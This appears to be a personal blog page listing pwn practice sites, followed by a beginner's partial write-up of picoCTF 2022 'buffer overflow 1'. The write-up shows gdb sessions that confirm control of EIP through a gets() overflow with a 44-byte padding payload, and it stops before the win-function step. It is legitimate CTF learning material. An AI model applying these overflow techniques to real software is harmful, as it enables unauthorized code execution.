---
permalink: /misc/pwn
title: pwn
---

<br>

Websites with pwn challs:

<https://play.picoctf.org/practice?category=6>

<https://pwnable.kr>

<https://pwnable.tw>

<https://ropemporium.com>

<https://www.smashthestack.org/main.html>

<https://pwn.college>

<br>

# buffer overflow 1 - picoCTF 2022

<https://play.picoctf.org/practice/challenge/258>

My first ever pwn challenge... let's do it.

First I downloaded the vuln file and tried to run it.

```
$ ./vuln
bash: ./vuln: Permission denied
```

ok let's change the permissions.

```
$ chmod +x vuln 

$ ./vuln 
bash: ./vuln: cannot execute: required file not found
```

hmm weird. Let's get some more info

```
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

oh it's 32-bit, gotta install lib32-glibc.

```
$ sudo pacman -S lib32-glibc

$ ./vuln 
Please enter your string: 
test
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

cool now we can actually run the ELF.

Then I installed <https://github.com/pwndbg/pwndbg/tree/dev>

```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Then when you launch gdb you see the pwndbg extension being used.

```
$ gdb
...

pwndbg: loaded 154 pwndbg commands and 44 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
Disable Pwndbg context information display with set context-sections ''
pwndbg>
```

If you don't want to use the extension you can enable/disable it in `~/.gdbinit`:

```
set debuginfod enabled on
# source /home/connor/Documents/pwndbg/gdbinit.py
```

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

Note the vulnerable gets() function used, which we'll use to overflow buf and edit the EIP register to point to the win function. 


> EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.

Decompiling with IDA:

```
int vuln()
{
  int return_address; // eax
  char v2[36]; // [esp+0h] [ebp-28h] BYREF

  gets(v2);
  return_address = get_return_address();
  return printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", return_address);
}
```

The return_address int is 4 bytes, plus the char buffer is 36 bytes, plus the EBP is 4 bytes.

After those 44 we are overwriting the return address. Let's verify it:

```python
>>> 'A'*44 + 'BBBB'
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'
```

```
pwndbg> run
Starting program:  
No executable file specified.
Use the "file" or "exec-file" command.
pwndbg> exec-file vuln
pwndbg> run
Starting program: /home/connor/Desktop/vuln 
[Thread debugging using libthread_db enabled]                                                              
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Okay, time to return... Fingers Crossed... Jumping to 0x42424242

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
*EAX  0x41
*EBX  0x41414141 ('AAAA')
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049350 ◂— endbr32 
*EBP  0x41414141 ('AAAA')
*ESP  0xffffd5f0 ◂— 0xffffff00
*EIP  0x42424242 ('BBBB')
────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────
Invalid address 0x42424242

...
```

And you can see `*EIP  0x42424242 ('BBBB')` we can control EIP by changing BBBB :) 

Now let's find the address of the win function. 
